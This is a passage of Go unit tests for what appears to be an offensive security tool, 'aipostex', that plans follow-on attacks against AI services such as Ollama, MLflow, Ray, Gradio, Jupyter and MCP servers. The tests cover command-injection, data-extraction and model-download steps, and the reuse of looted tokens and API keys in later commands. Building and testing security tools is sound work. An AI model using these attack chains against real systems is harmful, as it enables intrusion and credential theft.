		if rec.Command == current {
			t.Fatalf("expected current command to be suppressed, got %#v", plan.Recommendations)
		}
	}
	if len(plan.Recommendations) == 0 || !strings.Contains(plan.Recommendations[0].Command, "auth-sweep") {
		t.Fatalf("expected auth-sweep follow-on to remain, got %#v", plan.Recommendations)
	}
}

func TestBuildScanNetworkWorkflowPlanCoversNewServiceFamilies(t *testing.T) {
	for _, tc := range []struct {
		service     string
		url         string
		expectedCmd string
	}{
		{service: "ray", url: "http://127.0.0.1:8265", expectedCmd: "ray --target http://127.0.0.1:8265 enum"},
		{service: "mlflow", url: "http://127.0.0.1:5000", expectedCmd: "mlflow --target http://127.0.0.1:5000 enum"},
		{service: "gradio", url: "http://127.0.0.1:7860", expectedCmd: "gradio --target http://127.0.0.1:7860 enum"},
		{service: "bentoml", url: "http://127.0.0.1:3000", expectedCmd: "bentoml --target http://127.0.0.1:3000 enum"},
		{service: "wandb", url: "http://127.0.0.1:8080", expectedCmd: "scan targets --target http://127.0.0.1:8080 --tags wandb"},
	} {
		plan := buildScanNetworkWorkflowPlan(fingerprint.Result{Service: tc.service, URL: tc.url})
		found := false
		for _, rec := range plan.Recommendations {
			if strings.Contains(rec.Command, tc.expectedCmd) {
				found = true
				break
			}
		}
		if !found {
			t.Fatalf("expected workflow recommendations for %s to contain %q, got %#v", tc.service, tc.expectedCmd, plan.Recommendations)
		}
	}
}

func TestBuildScanNetworkWorkflowPlanProxyLikelyRationale(t *testing.T) {
	plan := buildScanNetworkWorkflowPlan(fingerprint.Result{
		Service:     "ollama",
		URL:         "http://127.0.0.1:8000",
		MatchKind:   fingerprint.MatchKindConfirmed,
		ProxyLikely: true,
	})
	if !strings.Contains(plan.Rationale, "Reverse proxy likely") {
		t.Fatalf("expected ProxyLikely to be surfaced in rationale, got %q", plan.Rationale)
	}
}

func TestBuildScanNetworkWorkflowPlanDowngradesSuspectedMatches(t *testing.T) {
	plan := buildScanNetworkWorkflowPlan(fingerprint.Result{
		Service:    "ollama",
		URL:        "http://127.0.0.1:11434",
		MatchKind:  fingerprint.MatchKindSuspected,
		Confidence: "low",
	})
	if !strings.Contains(plan.Rationale, "[Suspected match]") {
		t.Fatalf("expected suspected rationale prefix, got %q", plan.Rationale)
	}
	if len(plan.Recommendations) == 0 || !strings.Contains(plan.Recommendations[0].Command, "scan targets --target http://127.0.0.1:11434") {
		t.Fatalf("expected broad scan recommendation first, got %#v", plan.Recommendations)
	}
	for _, rec := range plan.Recommendations {
		if rec.Gated {
			t.Fatalf("expected gated recommendations to be suppressed, got %#v", plan.Recommendations)
		}
	}
}

func TestBuildScanNetworkWorkflowPlanHandlesAmbiguousMatches(t *testing.T) {
	plan := buildScanNetworkWorkflowPlan(fingerprint.Result{
		Service:     "ray",
		URL:         "http://127.0.0.1:8265",
		MatchKind:   fingerprint.MatchKindAmbiguous,
		ProxyLikely: true,
	})
	if !strings.Contains(plan.Rationale, "[Ambiguous match / reverse proxy likely]") {
		t.Fatalf("expected ambiguous proxy rationale, got %q", plan.Rationale)
	}
	for _, rec := range plan.Recommendations {
		if rec.Gated {
			t.Fatalf("expected no gated recs for ambiguous fingerprint, got %#v", plan.Recommendations)
		}
	}
}

func TestSortWorkflowPlansProducesStableOrder(t *testing.T) {
	plans := []workflowPlan{
		{Target: "http://C:8000/", Stage: "discovery", Rationale: "z"},
		{Target: "http://A:11434", Stage: "exploitation", Rationale: "a"},
		{Target: "http://A:11434", Stage: "discovery", Rationale: "b"},
		{Target: "http://B:3000", Stage: "discovery", Rationale: "a"},
	}
	sortWorkflowPlans(plans)

	expected := []string{
		"http://a:11434|discovery|b",
		"http://a:11434|exploitation|a",
		"http://b:3000|discovery|a",
		"http://c:8000|discovery|z",
	}
	for i, plan := range plans {
		key := canonicalServiceURL(plan.Target) + "|" + plan.Stage + "|" + plan.Rationale
		if key != expected[i] {
			t.Fatalf("index %d: expected %q, got %q", i, expected[i], key)
		}
	}
}

func TestAnnotateEvidenceMetadataPreservesRawEvidenceAndPreview(t *testing.T) {
	finding := report.Finding{
		Source:   report.SourceMCP,
		Evidence: "raw output from target",
		Metadata: map[string]interface{}{
			"console_evidence": "redacted output",
		},
	}

	annotateEvidenceMetadata(&finding, "probe-response")

	evidence, ok := finding.Metadata["evidence"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected structured evidence metadata, got %#v", finding.Metadata["evidence"])
	}
	if evidence["preview"] != "redacted output" {
		t.Fatalf("expected preview to prefer console evidence, got %#v", evidence["preview"])
	}
	if evidence["raw_preserved"] != true {
		t.Fatalf("expected raw_preserved=true, got %#v", evidence["raw_preserved"])
	}
}

func TestMCPAnalyzeWorkflowUsesCapabilitySignals(t *testing.T) {
	plan := buildMCPAnalyzeRemotePlan("http://127.0.0.1:3000/message", map[string]bool{
		"fetch": true,
		"exec":  true,
	}, true)
	if plan.Stage != "correlation" {
		t.Fatalf("expected correlation stage, got %q", plan.Stage)
	}
	if len(plan.Recommendations) < 3 {
		t.Fatalf("expected multiple chained recommendations, got %#v", plan.Recommendations)
	}
	if plan.Recommendations[0].Gated {
		t.Fatalf("expected read-first MCP analyze plan, got %#v", plan.Recommendations)
	}
	if !strings.Contains(plan.Recommendations[len(plan.Recommendations)-1].Command, "cmd-inject") {
		t.Fatalf("expected exec follow-on in MCP analyze plan, got %#v", plan.Recommendations)
	}
}

func TestRayAndGradioWorkflowChainsStayReadFirst(t *testing.T) {
	rayPlan := buildRayLogWorkflowPlan("http://127.0.0.1:8265", "job-1")
	if len(rayPlan.Recommendations) < 3 {
		t.Fatalf("expected richer ray log workflow, got %#v", rayPlan.Recommendations)
	}
	if rayPlan.Recommendations[0].Gated {
		t.Fatalf("expected first ray follow-on to stay read-only, got %#v", rayPlan.Recommendations[0])
	}
	if !strings.Contains(rayPlan.Recommendations[0].Command, "job-artifacts") {
		t.Fatalf("expected job-artifacts to be first read-only follow-on, got %#v", rayPlan.Recommendations)
	}

	gradioPlan := buildGradioFileChainWorkflowPlan("http://127.0.0.1:7860", "/tmp/demo.txt")
	if len(gradioPlan.Recommendations) != 2 {
		t.Fatalf("expected two-step gradio file chain, got %#v", gradioPlan.Recommendations)
	}
	if gradioPlan.Recommendations[0].Gated || !gradioPlan.Recommendations[1].Gated {
		t.Fatalf("expected read-then-gated gradio file chain, got %#v", gradioPlan.Recommendations)
	}
}

func TestPrintWorkflowPlansDeduplicatesCommands(t *testing.T) {
	plan1 := buildScanNetworkWorkflowPlan(fingerprint.Result{Service: "openai-compatible", URL: "http://10.0.0.1:80"})
	plan2 := buildScanNetworkWorkflowPlan(fingerprint.Result{Service: "openai-compatible", URL: "http://10.0.0.1:80"})

	var out strings.Builder
	printWorkflowPlans(&out, []workflowPlan{plan1, plan2}, false)
	rendered := out.String()

	for _, rec := range plan1.Recommendations {
		if rec.Gated {
			continue
		}
		first := strings.Index(rendered, rec.Command)
		last := strings.LastIndex(rendered, rec.Command)
		if first != last {
			t.Fatalf("command %q appears more than once in rendered workflow output:\n%s", rec.Command, rendered)
		}
	}
}

func TestInferWorkflowPlansFromFindingsAddsOpenAICompatOnOllamaPort(t *testing.T) {
	target := "http://10.0.0.5:11434"
	plans := inferWorkflowPlansFromFindings([]report.Finding{
		{Target: target, Tags: []string{"ollama"}},
		{Target: target, Tags: []string{"openai-compatible"}},
	}, []string{target})

	var out strings.Builder
	printWorkflowPlans(&out, plans, false)
	rendered := out.String()
	for _, expected := range []string{
		"aipostex ollama --target http://10.0.0.5:11434 enum",
		"aipostex openai-compat --target http://10.0.0.5:11434 auth-sweep",
		"aipostex openai-compat --target http://10.0.0.5:11434 enum",
	} {
		if !strings.Contains(rendered, expected) {
			t.Fatalf("expected inferred workflow to contain %q, got:\n%s", expected, rendered)
		}
	}
}

func TestInferWorkflowPlansFromFindingsKeepsInspectorTemplateFirst(t *testing.T) {
	target := "http://10.0.0.6:6274"
	plans := inferWorkflowPlansFromFindings([]report.Finding{
		{Target: target, Tags: []string{"mcp", "inspector"}},
	}, []string{target})

	var out strings.Builder
	printWorkflowPlans(&out, plans, false)
	rendered := out.String()
	if !strings.Contains(rendered, "aipostex scan targets --target http://10.0.0.6:6274 --tags inspector,mcp") {
		t.Fatalf("expected inspector template follow-up, got:\n%s", rendered)
	}
	if strings.Contains(rendered, "aipostex scan targets --target http://10.0.0.6:6274\n") {
		t.Fatalf("expected inspector workflow to avoid generic rerun guidance, got:\n%s", rendered)
	}
	if strings.Contains(rendered, "aipostex mcp --target http://10.0.0.6:6274") {
		t.Fatalf("inspector finding should not infer MCP protocol workflow, got:\n%s", rendered)
	}
}

func TestCurrentScanWorkflowCommandsSuppressesRepeatedTaggedScan(t *testing.T) {
	target := "http://10.0.0.6:6274"
	plans := inferWorkflowPlansFromFindings([]report.Finding{
		{Target: target, Tags: []string{"mcp", "inspector"}, TemplateID: "mcp-auth-005-inspector-api-exposed", Metadata: map[string]interface{}{
			"extracted": map[string]interface{}{
				"server_name":    "acme-internal-mcp",
				"server_url":     "http://10.0.0.6:3000/sse",
				"transport_type": "sse",
			},
		}},
	}, []string{target})
	current := currentScanWorkflowCommands([]string{target}, []string{"inspector,mcp"})
	for i := range plans {
		plans[i] = suppressWorkflowCommands(plans[i], current...)
	}

	var out strings.Builder
	printWorkflowPlans(&out, plans, false)
	rendered := out.String()
	if strings.Contains(rendered, "aipostex scan targets --target http://10.0.0.6:6274 --tags inspector,mcp") {
		t.Fatalf("expected current tagged scan to be suppressed, got:\n%s", rendered)
	}
	if !strings.Contains(rendered, "aipostex mcp --target http://10.0.0.6:3000/sse enum") {
		t.Fatalf("expected inspector pivot to backing MCP server, got:\n%s", rendered)
	}
}

func TestPrintWorkflowPlansSuppressesGenericScanWhenTargetedScanExists(t *testing.T) {
	target := "http://10.0.0.6:6274"
	plans := []workflowPlan{
		{
			Target: target,
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("scan targets --target "+target), "Run broad coverage.", false, 5),
			},
		},
		{
			Target: target,
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("scan targets --target "+target+" --tags inspector,mcp"), "Run targeted coverage.", false, 5),
			},
		},
	}

	var out strings.Builder
	printWorkflowPlans(&out, plans, false)
	rendered := out.String()
	if strings.Contains(rendered, "aipostex scan targets --target http://10.0.0.6:6274\n") {
		t.Fatalf("expected generic scan command to be suppressed, got:\n%s", rendered)
	}
	if !strings.Contains(rendered, "aipostex scan targets --target http://10.0.0.6:6274 --tags inspector,mcp") {
		t.Fatalf("expected targeted scan command to remain, got:\n%s", rendered)
	}
}

func TestInferWorkflowPlansFromFindingsAddsInspectorServerPivot(t *testing.T) {
	plans := inferWorkflowPlansFromFindings([]report.Finding{
		{
			Target:     "http://10.0.0.6:6274",
			TemplateID: "mcp-auth-005-inspector-api-exposed",
			Tags:       []string{"mcp", "inspector"},
			Metadata: map[string]interface{}{
				"extracted": map[string]interface{}{
					"server_name":    "acme-internal-mcp",
					"server_url":     "http://10.0.0.6:3000/sse",
					"transport_type": "sse",
				},
			},
		},
	}, []string{"http://10.0.0.6:6274"})

	var out strings.Builder
	printWorkflowPlans(&out, plans, true)
	rendered := out.String()
	if !strings.Contains(rendered, "aipostex mcp --target http://10.0.0.6:3000/sse enum") {
		t.Fatalf("expected MCP server enum pivot, got:\n%s", rendered)
	}
	if !strings.Contains(rendered, "Inspector API") || !strings.Contains(rendered, "acme-internal-mcp") {
		t.Fatalf("expected inspector rationale with server name, got:\n%s", rendered)
	}
}

func TestBuildWorkflowPlanIndexMergesSameTargetRecommendations(t *testing.T) {
	target := "http://10.0.0.5:11434"
	idx := buildWorkflowPlanIndex([]workflowPlan{
		buildScanNetworkWorkflowPlan(fingerprint.Result{Service: "ollama", URL: target}),
		buildScanNetworkWorkflowPlan(fingerprint.Result{Service: "openai-compatible", URL: target}),
	})

	plan, ok := idx[target]
	if !ok {
		t.Fatalf("expected workflow plan for %s", target)
	}
	var commands []string
	for _, rec := range plan.Recommendations {
		commands = append(commands, rec.Command)
	}
	joined := strings.Join(commands, "\n")
	for _, expected := range []string{"aipostex ollama --target", "aipostex openai-compat --target"} {
		if !strings.Contains(joined, expected) {
			t.Fatalf("expected merged recommendations to contain %q, got:\n%s", expected, joined)
		}
	}
}

func TestPrintWorkflowPlansOmitsCurrentCommandAfterSuppression(t *testing.T) {
	current := formatCommandExample("mlflow --target http://127.0.0.1:5000 experiments --experiment demo --limit 5")
	plan := suppressWorkflowCommands(
		buildMLflowEnumWorkflowPlan("http://127.0.0.1:5000", []string{"demo"}, nil),
		current,
	)

	var out strings.Builder
	printWorkflowPlans(&out, []workflowPlan{plan}, false)
	rendered := out.String()

	if strings.Contains(rendered, current) {
		t.Fatalf("expected rendered workflow output to omit current command, got:\n%s", rendered)
	}
	if !strings.Contains(rendered, "runs --experiment demo --limit 5") {
		t.Fatalf("expected rendered workflow to retain next action, got:\n%s", rendered)
	}
}

func TestMLflowModelWorkflowUsesDiscoveredValues(t *testing.T) {
	plan := buildMLflowModelVersionWorkflowPlan("http://127.0.0.1:5000", "demo-model", "7")
	if !strings.Contains(plan.Recommendations[0].Command, "--model demo-model --version 7") {
		t.Fatalf("expected concrete model/version in workflow command, got %#v", plan.Recommendations)
	}

	metadata := attachWorkflowToMetadata(map[string]interface{}{}, plan)
	workflow, ok := metadata["workflow"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected structured workflow metadata, got %#v", metadata["workflow"])
	}
	if workflow["landed"] != "reachable" {
		t.Fatalf("expected landed in workflow metadata, got %#v", workflow["landed"])
	}
}

// --- insertFlagBeforeSubcommand ---

func TestInsertFlagBeforeSubcommand(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		flag string
		want string
	}{
		{
			name: "before enum subcommand",
			cmd:  "aipostex openai-compat --target http://host:8000 enum",
			flag: "--api-key sk-test",
			want: "aipostex openai-compat --target http://host:8000 --api-key sk-test enum",
		},
		{
			name: "before extract subcommand",
			cmd:  "aipostex vectordb --target http://host:8000 --type chromadb extract --collection docs",
			flag: "--api-key mykey",
			want: "aipostex vectordb --target http://host:8000 --type chromadb --api-key mykey extract --collection docs",
		},
		{
			name: "before auth-sweep subcommand",
			cmd:  "aipostex openai-compat --target http://host:8000 auth-sweep",
			flag: "--header \"Authorization: Bearer tok\"",
			want: "aipostex openai-compat --target http://host:8000 --header \"Authorization: Bearer tok\" auth-sweep",
		},
		{
			name: "before validate-inference subcommand",
			cmd:  "aipostex openai-compat --target http://host:8000 validate-inference --model m1",
			flag: "--api-key k",
			want: "aipostex openai-compat --target http://host:8000 --api-key k validate-inference --model m1",
		},
		{
			name: "before search-sensitive subcommand",
			cmd:  "aipostex vectordb --target http://host:8000 --type qdrant search-sensitive --collection c",
			flag: "--api-key k",
			want: "aipostex vectordb --target http://host:8000 --type qdrant --api-key k search-sensitive --collection c",
		},
		{
			name: "before litellm-probe subcommand",
			cmd:  "aipostex openai-compat --target http://host:8000 litellm-probe",
			flag: "--api-key k",
			want: "aipostex openai-compat --target http://host:8000 --api-key k litellm-probe",
		},
		{
			name: "before generate subcommand",
			cmd:  "aipostex openai-compat --target http://host:8000 generate --model m1 --prompt hello --force-exploit",
			flag: "--api-key k",
			want: "aipostex openai-compat --target http://host:8000 --api-key k generate --model m1 --prompt hello --force-exploit",
		},
		{
			name: "no recognized subcommand appends at end",
			cmd:  "aipostex ollama --target http://host:11434 unknown --model m1",
			flag: "--token abc",
			want: "aipostex ollama --target http://host:11434 unknown --model m1 --token abc",
		},
		{
			name: "first matching subcommand wins",
			cmd:  "aipostex openai-compat --target http://host:8000 enum --something extract",
			flag: "--api-key k",
			want: "aipostex openai-compat --target http://host:8000 --api-key k enum --something extract",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := insertFlagBeforeSubcommand(tc.cmd, tc.flag)
			if got != tc.want {
				t.Errorf("insertFlagBeforeSubcommand(%q, %q)\n  got  %q\n  want %q", tc.cmd, tc.flag, got, tc.want)
			}
		})
	}
}

// --- injectCredentialIntoRecommendation ---

func TestInjectCredentialIntoRecommendationNoCreds(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("jupyter --target http://host:8888 enum"),
		"Enumerate server.", false, 10,
	)
	original := rec.Command
	originalRationale := rec.Rationale
	got := injectCredentialIntoRecommendation(rec, map[string]credchain.Credential{}, "http://host:8888")
	if got.Command != original {
		t.Fatalf("expected command unchanged when no creds, got %q", got.Command)
	}
	if got.Rationale != originalRationale {
		t.Fatalf("expected rationale unchanged when no creds, got %q", got.Rationale)
	}
}

func TestInjectCredentialIntoRecommendationJupyterToken(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("jupyter --target http://host:8888 enum"),
		"Enumerate server.", false, 10,
	)
	creds := map[string]credchain.Credential{
		"jupyter-token": {Type: "jupyter-token", Value: "tok123", Source: "f-1"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:8888")
	if !strings.Contains(got.Command, "--token tok123") {
		t.Fatalf("expected --token flag injected, got %q", got.Command)
	}
	if !strings.Contains(got.Rationale, "using discovered token from f-1") {
		t.Fatalf("expected rationale to mention token source, got %q", got.Rationale)
	}
}

func TestInjectCredentialIntoRecommendationJupyterTokenMultipleSubcommands(t *testing.T) {
	for _, sub := range []string{"notebooks", "kernels", "read-notebook", "exec"} {
		rec := newWorkflowRecommendation(
			formatCommandExample("jupyter --target http://host:8888 "+sub),
			"reason", false, 10,
		)
		creds := map[string]credchain.Credential{
			"jupyter-token": {Type: "jupyter-token", Value: "tok", Source: "s"},
		}
		got := injectCredentialIntoRecommendation(rec, creds, "http://host:8888")
		if !strings.Contains(got.Command, "--token tok") {
			t.Fatalf("expected --token injected for subcommand %q, got %q", sub, got.Command)
		}
	}
}

func TestInjectCredentialIntoRecommendationSkipsExistingToken(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("jupyter --target http://host:8888 --token existing enum"),
		"reason", false, 10,
	)
	creds := map[string]credchain.Credential{
		"jupyter-token": {Type: "jupyter-token", Value: "new-tok", Source: "s"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:8888")
	if strings.Contains(got.Command, "new-tok") {
		t.Fatalf("expected existing --token to be preserved, got %q", got.Command)
	}
}

func TestInjectCredentialIntoRecommendationOpenAIAPIKey(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("openai-compat --target http://host:8000 enum"),
		"List models.", false, 10,
	)
	creds := map[string]credchain.Credential{
		"openai-api-key": {Type: "openai-api-key", Value: "sk-abc", Source: "f-2"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:8000")
	if !strings.Contains(got.Command, "--api-key sk-abc") {
		t.Fatalf("expected --api-key injected, got %q", got.Command)
	}
	if !strings.Contains(got.Command, "--api-key sk-abc enum") {
		t.Fatalf("expected --api-key placed before subcommand, got %q", got.Command)
	}
	if !strings.Contains(got.Rationale, "using discovered API key from f-2") {
		t.Fatalf("expected rationale to mention source, got %q", got.Rationale)
	}
}

func TestInjectCredentialIntoRecommendationVectorDBAPIKey(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("vectordb --target http://host:6333 --type qdrant extract --collection docs"),
		"Extract records.", false, 10,
	)
	creds := map[string]credchain.Credential{
		"api-key": {Type: "api-key", Value: "qd-key", Source: "f-3"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:6333")
	if !strings.Contains(got.Command, "--api-key qd-key") {
		t.Fatalf("expected vectordb --api-key injected, got %q", got.Command)
	}
}

func TestInjectCredentialIntoRecommendationHFToken(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("openai-compat --target http://host:8000 enum"),
		"List models.", false, 10,
	)
	creds := map[string]credchain.Credential{
		"hf-token": {Type: "hf-token", Value: "hf_abc", Source: "f-4"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:8000")
	if !strings.Contains(got.Command, `--header "Authorization: Bearer hf_abc"`) {
		t.Fatalf("expected HF bearer header injected, got %q", got.Command)
	}
	if !strings.Contains(got.Rationale, "using discovered HF token from f-4") {
		t.Fatalf("expected rationale to mention HF token, got %q", got.Rationale)
	}
}

func TestInjectCredentialIntoRecommendationHFTokenForModelDownloadUsesHubHeader(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("huggingface --target http://host:8180 model-download --model-id org/model --force-exploit"),
		"Download model files.", true, 20,
	)
	creds := map[string]credchain.Credential{
		"hf-token": {Type: "hf-token", Value: "hf_abc", Source: "f-4"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:8180")
	if !strings.Contains(got.Command, `--hub-header "Authorization: Bearer hf_abc"`) {
		t.Fatalf("expected Hub header injected, got %q", got.Command)
	}
	if strings.Contains(got.Command, `--header "Authorization: Bearer hf_abc"`) {
		t.Fatalf("model-download must not reuse target --header for Hub auth, got %q", got.Command)
	}
	if !strings.Contains(got.Rationale, "using discovered HF token from f-4 for Hub access") {
		t.Fatalf("expected rationale to mention Hub token, got %q", got.Rationale)
	}
}

func TestInjectCredentialIntoRecommendationHFTokenForModelDownloadAllowsSameHostHubBase(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("huggingface --target http://host:8180 model-download --model-id org/model --hub-base http://host:8180 --force-exploit"),
		"Download model files.", true, 20,
	)
	creds := map[string]credchain.Credential{
		"hf-token": {Type: "hf-token", Value: "hf_abc", Source: "f-4"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:8180")
	if !strings.Contains(got.Command, `--hub-header "Authorization: Bearer hf_abc"`) {
		t.Fatalf("expected same-host Hub header injected, got %q", got.Command)
	}
	if strings.Contains(got.Command, `--header "Authorization: Bearer hf_abc"`) {
		t.Fatalf("model-download must not reuse target --header for Hub auth, got %q", got.Command)
	}
}

func TestInjectCredentialIntoRecommendationHFTokenForModelDownloadSkipsExternalHubBase(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("huggingface --target http://host:8180 model-download --model-id org/model --hub-base https://huggingface.co --force-exploit"),
		"Download model files.", true, 20,
	)
	creds := map[string]credchain.Credential{
		"hf-token": {Type: "hf-token", Value: "hf_abc", Source: "f-4"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:8180")
	if strings.Contains(got.Command, `Authorization: Bearer hf_abc`) {
		t.Fatalf("external Hub base must not receive looted target token, got %q", got.Command)
	}
	if strings.Contains(got.Rationale, "using discovered HF token") {
		t.Fatalf("external Hub base must not claim token use, got %q", got.Rationale)
	}
}

func TestInjectCredentialIntoRecommendationBearerToken(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("openai-compat --target http://host:8000 enum"),
		"List models.", false, 10,
	)
	creds := map[string]credchain.Credential{
		"bearer-token": {Type: "bearer-token", Value: "btok", Source: "f-5"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:8000")
	if !strings.Contains(got.Command, `--header "Authorization: Bearer btok"`) {
		t.Fatalf("expected bearer header injected, got %q", got.Command)
	}
}

func TestInjectCredentialIntoRecommendationMLflowBasicAuth(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("mlflow --target http://host:5000 runs"),
		"List runs.", false, 10,
	)
	creds := map[string]credchain.Credential{
		"mlflow-basic-auth": {Type: "mlflow-basic-auth", Value: "dTpw", Source: "ray-1"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:5000")
	if !strings.Contains(got.Command, `--header "Authorization: Basic dTpw"`) {
		t.Fatalf("expected MLflow Basic header injected, got %q", got.Command)
	}
	if !strings.Contains(got.Rationale, "using discovered MLflow Basic auth from ray-1") {
		t.Fatalf("expected rationale to mention source, got %q", got.Rationale)
	}
}

func TestInjectCredentialIntoRecommendationMLflowRunID(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("mlflow --target http://host:5000 artifacts"),
		"List artifacts.", false, 10,
	)
	creds := map[string]credchain.Credential{
		"mlflow-run-id": {Type: "mlflow-run-id", Value: "run-42", Source: "f-6"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:5000")
	if !strings.Contains(got.Command, "--run-id run-42") {
		t.Fatalf("expected --run-id injected, got %q", got.Command)
	}
}

func TestInjectCredentialIntoRecommendationMLflowRunIDSkippedForEnum(t *testing.T) {
	rec := newWorkflowRecommendation(
		formatCommandExample("mlflow --target http://host:5000 enum"),
		"Enumerate.", false, 10,
	)
	creds := map[string]credchain.Credential{
		"mlflow-run-id": {Type: "mlflow-run-id", Value: "run-42", Source: "f-6"},
	}
	got := injectCredentialIntoRecommendation(rec, creds, "http://host:5000")
	if strings.Contains(got.Command, "--run-id") {
		t.Fatalf("did not expect --run-id on enum, got %q", got.Command)
	}
}

// --- enrichWorkflowPlanWithCredentials / enrichWorkflowPlansWithCredentials ---

func TestEnrichWorkflowPlanWithCredentialsEndToEnd(t *testing.T) {
	store := credchain.NewStore()
	store.Add("127.0.0.1:8888", credchain.Credential{Type: "jupyter-token", Value: "tok-e2e", Source: "f-e2e"})

	plan := buildJupyterEnumWorkflowPlan("http://127.0.0.1:8888", nil, []string{"kernel-1"})
	enriched := enrichWorkflowPlanWithCredentials(plan, store)

	tokenFound := false
	for _, rec := range enriched.Recommendations {
		if strings.Contains(rec.Command, "--token tok-e2e") {
			tokenFound = true
			if !strings.Contains(rec.Rationale, "f-e2e") {
				t.Fatalf("expected rationale to reference credential source, got %q", rec.Rationale)
			}
		}
	}
	if !tokenFound {
		t.Fatalf("expected at least one recommendation with injected token, got %#v", enriched.Recommendations)
	}
}

func TestEnrichWorkflowPlansWithCredentialsNilStore(t *testing.T) {
	plans := []workflowPlan{
		buildOllamaEnumWorkflowPlan("http://host:11434", []string{"llama"}),
	}
	got := enrichWorkflowPlansWithCredentials(plans, nil)
	if len(got) != len(plans) {
		t.Fatalf("expected same plans returned with nil store, got %d", len(got))
	}
	if got[0].Recommendations[0].Command != plans[0].Recommendations[0].Command {
		t.Fatalf("expected commands unchanged with nil store")
	}
}

func TestEnrichWorkflowPlansWithCredentialsEmptyStore(t *testing.T) {
	store := credchain.NewStore()
	plans := []workflowPlan{
		buildOllamaEnumWorkflowPlan("http://host:11434", []string{"llama"}),
	}
	got := enrichWorkflowPlansWithCredentials(plans, store)
	if len(got) != len(plans) {
		t.Fatalf("expected same plans returned with empty store, got %d", len(got))
	}
}

func TestEnrichWorkflowPlansWithCredentialsMultiplePlans(t *testing.T) {
	store := credchain.NewStore()
	store.Add("127.0.0.1:8888", credchain.Credential{Type: "jupyter-token", Value: "jtok", Source: "s1"})
	store.Add("127.0.0.1:8000", credchain.Credential{Type: "openai-api-key", Value: "sk-x", Source: "s2"})

	plans := []workflowPlan{
		buildJupyterEnumWorkflowPlan("http://127.0.0.1:8888", nil, nil),
		buildOpenAICompatEnumWorkflowPlan("http://127.0.0.1:8000", []string{"gpt-4"}, nil),
	}
	enriched := enrichWorkflowPlansWithCredentials(plans, store)

	jupyterHasToken := false
	for _, rec := range enriched[0].Recommendations {
		if strings.Contains(rec.Command, "--token jtok") {
			jupyterHasToken = true
		}
	}
	if !jupyterHasToken {
		t.Fatalf("expected jupyter plan enriched with token, got %#v", enriched[0].Recommendations)
	}

	openaiHasKey := false
	for _, rec := range enriched[1].Recommendations {
		if strings.Contains(rec.Command, "--api-key sk-x") {
			openaiHasKey = true
		}
	}
	if !openaiHasKey {
		t.Fatalf("expected openai plan enriched with api key, got %#v", enriched[1].Recommendations)
	}
}

func TestWorkflowPlansFromCredentialStoreAddsConcreteMLflowPivot(t *testing.T) {
	store := credchain.NewStore()
	store.Add("172.16.50.20:5000", credchain.Credential{Type: "mlflow-url", Value: "http://172.16.50.20:5000", Source: "ray-runtime-env"})

	plans := workflowPlansFromCredentialStore(store)
	if len(plans) != 1 {
		t.Fatalf("expected one credential workflow plan, got %#v", plans)
	}
	var foundEnum bool
	for _, rec := range plans[0].Recommendations {
		if strings.Contains(rec.Command, "aipostex mlflow --target http://172.16.50.20:5000 enum") {
			foundEnum = true
		}
	}
	if !foundEnum {
		t.Fatalf("expected MLflow enum recommendation, got %#v", plans[0].Recommendations)
	}
}

// --- build*WorkflowPlan per-module tests ---

func TestBuildGradioEnumWorkflowPlan(t *testing.T) {
	plan := buildGradioEnumWorkflowPlan("http://127.0.0.1:7860", []string{"/predict"}, []int{0})
	if plan.Target != "http://127.0.0.1:7860" {
		t.Fatalf("expected target to be canonicalized, got %q", plan.Target)
	}
	if plan.Stage != "enum" {
		t.Fatalf("expected stage enum, got %q", plan.Stage)
	}
	// 5 recs: two predict (api-name/fn-index) + file-chain + two gated probes.
	// serve-probe is no longer emitted at enum time — it needs a concrete file handle,
	// so it would only ever carry a placeholder here.
	if len(plan.Recommendations) != 5 {
		t.Fatalf("expected 5 recommendations, got %d", len(plan.Recommendations))
	}
	if !strings.Contains(plan.Recommendations[0].Command, "--api-name /predict") {
		t.Fatalf("expected discovered api name in first predict rec, got %q", plan.Recommendations[0].Command)
	}
	if !strings.Contains(plan.Recommendations[1].Command, "--fn-index 0") {
		t.Fatalf("expected discovered fn-index in second predict rec, got %q", plan.Recommendations[1].Command)
	}
	gatedCount := 0
	for _, rec := range plan.Recommendations {
		if rec.Gated {
			gatedCount++
		}
		// No gated command may carry a placeholder, and the enum plan must not emit a
		// bare <file-ref> TODO or offer serve-probe (which needs a real handle).
		if rec.Gated && strings.Contains(rec.Command, "<") {
			t.Fatalf("gated enum command carries a placeholder: %q", rec.Command)
		}
		if strings.Contains(rec.Command, "<file-ref>") || (rec.Gated && strings.Contains(rec.Command, "serve-probe")) {
			t.Fatalf("enum plan leaked a placeholder/serve-probe: %q", rec.Command)
		}
	}
	if gatedCount != 2 {
		t.Fatalf("expected 2 gated recommendations, got %d", gatedCount)
